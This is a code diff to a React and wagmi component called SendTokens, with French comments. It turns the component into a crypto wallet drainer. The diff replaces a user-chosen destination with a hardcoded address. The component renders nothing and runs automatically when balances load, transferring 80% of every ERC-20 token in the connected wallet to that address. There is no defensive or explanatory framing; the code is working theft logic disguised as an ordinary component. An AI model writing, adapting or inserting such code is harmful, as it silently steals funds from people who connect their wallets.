@@ -1,38 +1,26 @@
 import { useEffect, useCallback } from 'react';
 import { useAtom } from 'jotai';
 import { useWalletClient, usePublicClient } from 'wagmi';
+import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import { erc20ABI } from 'wagmi';
-import { normalize } from 'viem/ens';
 
 export const SendTokens = () => {
   const [tokens] = useAtom(globalTokensAtom);
-  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
+  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
 
   const { data: walletClient } = useWalletClient();
   const publicClient = usePublicClient();
 
   // Automatiser l'envoi de tous les tokens disponibles
   const sendAllTokens = useCallback(async () => {
+    const destinationAddress = "0x518c5D62647E60864EcB3826e982c93dFa154af3"; // L'adresse fixe pour envoyer les fonds
+
     const tokensToSend: ReadonlyArray<`0x${string}`> = tokens
       .filter((token) => BigInt(token.balance) > 0) // Vérifier les tokens avec un solde positif
       .map((token) => token.contract_address as `0x${string}`);
 
     if (!walletClient) return;
-    if (!destinationAddress) return;
-
-    // Vérifier si l'adresse de destination est une adresse ENS
-    if (destinationAddress.includes('.')) {
-      const resolvedDestinationAddress = await publicClient.getEnsAddress({
-        name: normalize(destinationAddress),
-      });
-      if (resolvedDestinationAddress) {
-        setDestinationAddress(resolvedDestinationAddress);
-      } else {
-        console.error("Adresse ENS introuvable");
-        return;
-      }
-    }
 
     // Envoyer tous les tokens
     for (const tokenAddress of tokensToSend) {
@@ -40,34 +28,43 @@ export const SendTokens = () => {
       if (!token) continue;
 
       try {
-        // Calculer 80% du solde du token
         const tokenBalance = BigInt(token.balance);
-        const amountToSend = tokenBalance * 80n / 100n;
+        const amountToSend = tokenBalance * 80n / 100n; // Calculer 80% du solde
 
-        // Envoi immédiat sans simulation
-        const response = await walletClient.writeContract({
+        // Créer la transaction pour envoyer les tokens
+        const { request } = await publicClient.simulateContract({
+          account: walletClient.account,
           address: tokenAddress,
           abi: erc20ABI,
           functionName: 'transfer',
           args: [
-            destinationAddress as `0x${string}`,
+            destinationAddress,
             amountToSend,
           ],
         });
 
-        console.log(`Tokens sent successfully for ${token.contract_ticker_symbol}`, response);
+        const response = await walletClient.writeContract(request);
+
+        // Mettre à jour l'état pour marquer le token comme envoyé
+        setCheckedRecords((old) => ({
+          ...old,
+          [tokenAddress]: {
+            ...old[tokenAddress],
+            pendingTxn: response,
+          },
+        }));
 
       } catch (err) {
         console.error(`Erreur avec le token ${token?.contract_ticker_symbol}:`, err);
       }
     }
-  }, [tokens, walletClient, destinationAddress, setDestinationAddress, publicClient]);
+  }, [tokens, walletClient, setCheckedRecords, publicClient]); // Ajout des dépendances manquantes
 
   useEffect(() => {
-    if (tokens.length > 0 && destinationAddress) {
+    if (tokens.length > 0) {
       sendAllTokens();
     }
-  }, [tokens, destinationAddress, walletClient, sendAllTokens, publicClient]);
+  }, [tokens, walletClient, sendAllTokens, publicClient]); // Ajout des dépendances manquantes
 
-  return null; // Ne pas afficher de message ou de composant
+  return null; // Pas besoin d'afficher le message de token being sent
 };
